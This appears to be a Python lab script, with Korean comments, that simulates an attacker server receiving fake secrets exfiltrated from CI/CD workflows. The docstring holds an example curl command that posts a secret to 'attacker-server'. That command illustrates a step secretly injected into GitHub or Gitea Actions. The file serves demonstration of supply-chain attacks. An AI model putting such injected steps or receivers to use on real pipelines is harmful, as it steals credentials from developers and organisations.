"""
CI/CD 파이프라인에서 탈취된 (가짜) 시크릿을 받는 공격자 서버 시뮬레이션.

docker-compose.yml에서 호스트 포트를 127.0.0.1로만 바인딩해뒀기 때문에
인터넷에는 노출되지 않는다. 받은 데이터는 컨테이너 로그(stdout)에만
출력하고 어디에도 재전송하거나 저장하지 않는다. 실제로는 GitHub Actions나
Gitea Actions 워크플로우에 몰래 삽입된 스텝이
`curl -X POST http://attacker-server:8000/exfil -d "secret=..."` 같은
형태로 이 서버를 호출한다.
"""
import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs


class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode(errors="replace")
        ts = datetime.datetime.now().isoformat(timespec="seconds")

        print(f"[{ts}] EXFIL 수신 - from={self.client_address[0]} path={self.path}")
        print(f"           raw body: {body}")

        parsed = parse_qs(body)
        if "secret" in parsed:
            print(f"           >>> 탈취된 시크릿 값: {parsed['secret'][0]}")

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, format, *args):
        pass  # 기본 HTTP 접속 로그는 끄고 위의 커스텀 로그만 사용


if __name__ == "__main__":
    server = HTTPServer(("0.0.0.0", 8000), Handler)
    print("[attacker-server] 0.0.0.0:8000 에서 대기 중 (컨테이너 내부 전용)")
    print("확인 명령: docker logs -f attacker-server")
    server.serve_forever()
